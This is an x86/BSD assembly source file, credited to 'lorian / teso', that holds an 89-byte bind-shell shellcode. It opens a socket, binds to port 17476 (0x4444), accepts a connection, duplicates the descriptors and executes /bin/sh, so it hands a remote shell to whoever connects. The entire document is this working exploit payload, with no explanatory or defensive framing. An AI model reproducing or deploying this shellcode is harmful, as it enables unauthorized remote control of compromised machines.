/* x86/BSD bindsh shellcode (89 bytes)
   
   lorian / teso
*/

	.globl  _cbegin
	.globl	cbegin
	.globl  _cend
	.globl	cend

_cbegin:
cbegin:
	movl	$0x3cfff8ff, %eax
	notl	%eax
	pushl	%eax
	xorl	%ebx, %ebx
	mull	%ebx
	movb	$0x9a, %al
	pushl	%eax
	movl	%esp, %ecx
	
	pushl   %ebx
	incl    %ebx
	pushl   %ebx
	incl	%ebx
	pushl   %ebx
	movb    $0xe6, %al
	call	*%ecx

	xchgl   %esi, %eax
	pushl	%edx
	pushw	$0x4444
	pushw	%bx
	movl	%esp, %ebp
	pushl   $0x10
	pushl	%ebp
	pushl   %esi
	xorl    %eax, %eax
	movb    $0xe8, %al
	call	*%ecx
	movb	$0xe9, %al
	call	*%ecx
	pusha
	popl    %edi
	movb    $0xea, %al
	call	*%ecx
a:	
	pushl	%ebx
	pushl   %eax
	movb	$0x3e, %al
	call	*%ecx
	decl	%ebx
	jns	a
	pushl	%edx
	push    $0x68732F6E
        push    $0x69622F2F
	movl	%esp, %ebx
	pushl	%edx
	pushl	%ebx
	movl	%esp, %edi
	pushl	%edx
	pushl	%edi
	pushl	%ebx
	movb	$0x3b, %al
	call	*%ecx
							
_cend:
cend:
